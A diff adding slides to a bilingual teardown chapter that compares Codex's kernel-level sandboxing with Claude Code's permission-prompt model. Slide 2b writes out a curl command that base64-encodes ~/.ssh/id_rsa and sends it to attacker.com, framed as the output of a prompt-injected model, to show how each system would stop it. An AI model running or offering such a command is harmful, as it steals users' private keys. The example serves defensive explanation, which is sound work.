@@ -1,6 +1,6 @@
 # Chapter 3 (Codex): Native Sandboxing — Three Platforms, Four Mechanisms, One Threat Model
 
-## ⏱️ Target Duration: ~50 minutes | 📑 ~20 slides | 📝 ~9,000 words
+## ⏱️ Target Duration: ~50 minutes | 📑 14 slides | 📝 ~9,000 words
 
 > **The most differentiated chapter of this teardown.** Claude Code has zero OS-level sandboxing — its safety story is "ask the user first." Codex has a 6-crate, 3-platform, kernel-enforced sandbox plus a MITM network proxy. This isn't a feature gap — this is two fundamentally different threat models.
 >
@@ -96,6 +96,30 @@ Defense: **kernel-level enforced isolation + network traffic MITM inspection + c
 > **关键洞察**：两个团队**对 LLM 的信任度**就不一样。Claude Code 把 LLM 当成会犯错的合作者；Codex 把 LLM 当成在受控环境下运行的不完全可信组件。这一个假设差异，从根上决定了你愿意付多少安全工程的成本。
 >
 > **Key insight**: The two teams have **different trust levels for the LLM**. Claude Code treats the LLM as an error-prone collaborator; Codex treats the LLM as a not-fully-trusted component running in a controlled environment. This single difference fundamentally determines how much safety engineering cost you're willing to pay.
+
+---
+
+### [07:00] Slide 2b: 同一条命令，两种结局——一次外泄攻击的实况
+
+理解威胁模型最有力的方法是看同一场攻击在两个系统里的走法。
+
+攻击载体：模型被 prompt 注入，产出这条命令——
+
+```
+curl https://attacker.com/?k=$(cat ~/.ssh/id_rsa | base64)
+```
+
+**Codex 一侧**：引擎把命令交给 `codex-linux-sandbox` helper 执行。Landlock 首先拦截 `cat ~/.ssh/id_rsa`——`~/.ssh` 不在可读白名单，内核直接返回 `EACCES`，文件根本读不到。即便假设 Landlock 被绕过（双重保险），MITM 网络代理发现 `attacker.com` 不在允许域名列表，外联请求得到 403。两道防线独立存在、互不依赖，全程不需要用户参与任何判断。
+
+In Codex, the engine passes the command to `codex-linux-sandbox`. Landlock blocks `cat ~/.ssh/id_rsa` first — `~/.ssh` is outside the readable allowlist, kernel returns `EACCES`, file never read. Even if Landlock were bypassed, the MITM proxy finds `attacker.com` absent from the domain allowlist and returns 403. Two independent layers, no user action required.
+
+**Claude Code 一侧**：模型生成相同的 `curl` 命令，触发权限确认弹窗——"运行 curl …?"。这道防线的厚度等于用户在那一刻的注意力。用户疲劳、信任、或误以为命令无害，点"允许"，命令在无 OS 沙箱的环境执行，SSH 私钥被 base64 外发。只有一道防线，且它是人。
+
+In Claude Code, the same command surfaces a permission prompt — "run curl …?" — and the entire defense is one human click. If the user approves (fatigue, trust, inattention), the command runs with no OS-level constraints and the private key is exfiltrated. One gate, and it's human.
+
+> **这就是威胁模型代价差的具体化**：Codex 假设模型"可能被攻陷"，把防线下沉到操作系统内核——即使用户被骗、即使命令已发出，内核与代理仍各拦一道。Claude Code 假设模型"基本良性"，最后一道防线是人的注意力。两种选择都自洽；只是赌注押在不同的环节。
+>
+> **This is the threat model cost differential made concrete**: Codex assumes the model "may be compromised" and sinks its defenses to the OS kernel — even if the user is fooled, even if the command is issued, kernel and proxy each block independently. Claude Code assumes the model is "mostly benign" and the last gate is human attention. Both are internally consistent — just betting on different failure points.
 
 ---
 
@@ -253,6 +277,48 @@ codex (主进程)              │  codex-linux-sandbox     │
 
 ---
 
+### [24:00] Slide 5b: 为什么沙箱要用独立 Helper 二进制？——因为 Landlock 是不可逆的
+
+上一张 slide 交代了 `codex-linux-sandbox` 是"牺牲者进程"的概念，这里是它在实现层面为什么必须是独立二进制，而不是主进程内的一个函数调用。
+
+调用链从 `codex-rs/core/src/landlock.rs:22` 的 `spawn_command_under_linux_sandbox()` 开始。这个函数不在主进程里做任何 Landlock 操作——它只是 fork 出一个独立进程，把"要执行的命令 + 权限策略（JSON）"传给外部的 `codex-linux-sandbox` 二进制。
+
+The call chain starts at `spawn_command_under_linux_sandbox()` at `codex-rs/core/src/landlock.rs:22`. This function does no Landlock operations in the main process — it forks and passes the command plus permission profile (as JSON) to the external `codex-linux-sandbox` binary.
+
+**为什么必须是独立进程，而不是主进程内的函数？** 根本原因是 Landlock 的 API 语义：一旦某进程提交了 Landlock 规则集，这个进程及其所有子进程就被永久限制，限制无法解除（irrevocable）。如果主引擎进程对自身提交规则集，它从此不能 spawn 任何不受限的进程——工具池、网络代理、IPC 全部废掉。
+
+The root cause is Landlock's irrevocable API contract: once a process commits a ruleset, it and all its descendants are permanently restricted — the restriction cannot be lifted. If the main engine process committed a Landlock ruleset on itself, it could never spawn another unrestricted process — the tool pool, network proxy, and IPC channels would all break.
+
+解决方案是：每次需要执行一条受限命令，就 fork 一个一次性的 helper 进程。Helper 接收策略，对自己提交 Landlock + seccomp 规则集，然后 `exec` 替换成目标命令——目标命令在锁死的沙箱内运行。Helper 生命周期终结，主引擎仍然自由。
+
+The solution: fork a throwaway helper per command. The helper receives the policy, commits Landlock + seccomp rulesets against itself, then `exec`s into the target command, which runs inside the locked sandbox. The helper's lifecycle ends; the main engine stays free.
+
+副效应是架构上的好处：沙箱逻辑独立成一个可以单独审计、单独分发、单独版本化的二进制，不和主引擎的 codebase 耦合。
+
+A side-effect is an architectural benefit: the sandbox logic becomes a separately auditable, separately distributed, separately versioned binary, decoupled from the main engine's codebase.
+
+---
+
+### [26:00] Slide 5c: 纵深防御矩阵——每种越界，至少被一层挡住
+
+三层机制（Landlock、namespace/bwrap、seccomp）不是冗余，是互补盲区的组合。把"攻击者想做的事"对着三列机制连成矩阵，每一行都至少有一个 ✓——这就是纵深防御（defense-in-depth）的可验证形式。
+
+Three layers (Landlock, namespace/bwrap, seccomp) are not redundant — they cover each other's blind spots. The matrix maps attacker goals against the three mechanism columns; every row has at least one ✓. That is defense-in-depth as a verifiable property.
+
+具体分工：Landlock 管**文件路径级**访问控制——阻止写 `/etc`，但它对 `ptrace` 一无所知。namespace（bwrap 建立的 mount/PID/user namespace）管**隔离边界**——限制 `ptrace` 只能看到同 PID namespace 内的进程、阻止 `mount` 挂载新文件系统，但它对单个文件路径的细粒度控制不如 Landlock。seccomp-bpf 管**syscall 级**过滤——直接过滤 `ptrace`、`mount` 等危险系统调用，但它看不到文件路径，无法区分"读 `/tmp`"和"读 `~/.ssh`"。
+
+Division of responsibility: Landlock handles file-path-level access control — blocks writes to `/etc` but knows nothing about `ptrace`. Namespace (the mount/PID/user namespaces bwrap creates) handles isolation boundaries — limits `ptrace` scope to within the same PID namespace, blocks mounting new filesystems, but lacks Landlock's per-path granularity. seccomp-bpf handles syscall-level filtering — directly filters `ptrace`, `mount`, and other dangerous calls, but sees no file paths and cannot distinguish "read `/tmp`" from "read `~/.ssh`".
+
+**旧内核降级路径**：Linux Landlock 需要 5.13+ 内核。旧内核没有 Landlock？优雅降级到 bwrap + seccomp，而不是直接裸奔。文件系统隔离变粗糙（mount namespace 级别，而非子树级），但 namespace 和 seccomp 两层仍在，不是零防御。
+
+**Old-kernel fallback**: Linux Landlock requires kernel 5.13+. On older kernels, Codex degrades gracefully to bwrap + seccomp rather than dropping all sandboxing. Filesystem isolation becomes coarser (mount namespace level, not per-path subtree), but two layers remain — not zero defense.
+
+> **纵深防御的可读性**：矩阵形式让"没有哪种越界能同时绕过三层"这个论断从设计意图变成可审计的属性。每次新增攻击场景，看一眼矩阵行就知道哪层负责挡——工程师不需要记住整个系统，只需要维护这张矩阵的完整性。
+>
+> **Readability of defense-in-depth**: the matrix form converts "no single breach bypasses all three layers" from a design intention into an auditable property. When a new attack scenario is added, one matrix row tells you which layer owns the block — engineers maintain the matrix's completeness rather than memorizing the whole system.
+
+---
+
 ### [27:00] Slide 6: Windows Restricted Token
 
 Windows 路径在 `codex-rs/windows-sandbox-rs/`。Codex 用 Windows API 的 **Restricted Token** 机制：
@@ -374,6 +440,38 @@ This is a **full-featured MITM HTTP/SOCKS5 proxy** compiled into the codex binar
 **结论**：Codex 在 sandbox 这个维度选了 **"Docker 之下、应用层之上"** 的中间档——比 permission prompt 强得多，比 Docker 轻量得多。这个中间档恰好是"工业级 agent 在不假设容器环境时"应该选的位置。
 
 **Conclusion**: Codex chose the **"below Docker, above application layer"** middle tier on sandboxing — much stronger than permission prompts, much lighter than Docker. This middle tier is exactly the right position for "industrial-grade agent in a non-containerized assumption."
+
+---
+
+### [44:00] Slide 9b: 该用哪种沙箱？——气闸舱决策树
+
+类比先行：**沙箱是气闸舱（airlock）**。宇航员进出空间站不直接面对真空，中间隔一个受控腔体——出去之前加压平衡，进来之前减压净化。沙箱就是 agent 与你系统之间那个"进出都要过检"的中间腔。腔体越厚越安全，但每次进出的延迟越高、操作越受限。**选型 = 选腔体厚度**，厚度必须匹配你的使用场景。
+
+Analogy first: a sandbox is an **airlock**. Astronauts don't step directly into vacuum — there's a controlled chamber where pressure equalizes before each passage. A sandbox is the controlled chamber between an agent and your system: everything in and out goes through inspection. Thicker chamber = more safety, more latency, more restriction. Choosing a sandbox is choosing chamber thickness — and thickness must match the use case.
+
+决策树四个分支，对应四个问题：
+
+The decision tree has four branches:
+
+**Codex 适用场景一**：你的 agent 会执行 LLM 生成的命令，或接入不可信第三方 MCP server。OS 级沙箱，约 100ms 启动开销，unprivileged——腔体厚度刚好够用，不过厚。这是 Codex 主打的场景。
+
+**Codex scenario 1**: your agent executes LLM-generated commands, or integrates untrusted third-party MCP servers. OS-level sandbox, ~100ms startup overhead, unprivileged — chamber thickness just right, not over-engineered. This is Codex's primary target.
+
+**Codex 适用场景二**：需要批量自动跑成百上千个任务的 CI 或批处理流水线。每个子任务在腔体内跑，任务本身不可信也无妨——沙箱 + 批处理组合的意义正在于此。
+
+**Codex scenario 2**: batch automation — hundreds or thousands of tasks in CI or pipeline. Each sub-task runs inside the chamber; the tasks themselves need not be trusted — that's the point of sandbox + batch combined.
+
+**重型隔离场景**：高安全多租户或 CI，需要完整的内核级隔离，选 gVisor 或容器。腔体更厚，代价是更重、更慢——gVisor 拦截每一个 syscall，容器需要 daemon + root。这是 Codex 有意不覆盖的区间（它不假设有 Docker 环境）。
+
+**Heavy isolation**: high-security multi-tenant or CI requiring full kernel-level isolation — gVisor or container. Thicker chamber, heavier, slower. gVisor intercepts every syscall; containers need daemon + root. Codex deliberately doesn't target this band (it doesn't assume Docker is available).
+
+**个人开发场景**：你信任自己写的 prompt，在自己的机器上跑，Claude Code 的权限弹窗够用。腔体薄到几乎透明，启动开销为零，工具兼容性完美。这是 Claude Code 对用户做出的准确承诺——正确场景里，它就是最好的选择。
+
+**Personal dev**: you trust the prompts you write, running on your own machine — Claude Code's permission prompt is sufficient. Chamber is nearly transparent, zero startup overhead, perfect tool compatibility. Claude Code makes an accurate promise for this scenario — in the right context, it's the right choice.
+
+> **决策树的价值**：它让"用哪个工具"从品牌偏好回归到工程判断。Codex 和 Claude Code 都是正确答案——取决于你的腔体厚度需求。把这张图贴在团队 wiki 里，比任何 benchmark 对比都更有助于做出架构决策。
+>
+> **Value of the decision tree**: it returns "which tool to use" from brand preference to engineering judgment. Codex and Claude Code are both correct answers — depending on your required chamber thickness. This diagram in your team wiki does more for architecture decisions than any benchmark comparison.
 
 ---
 
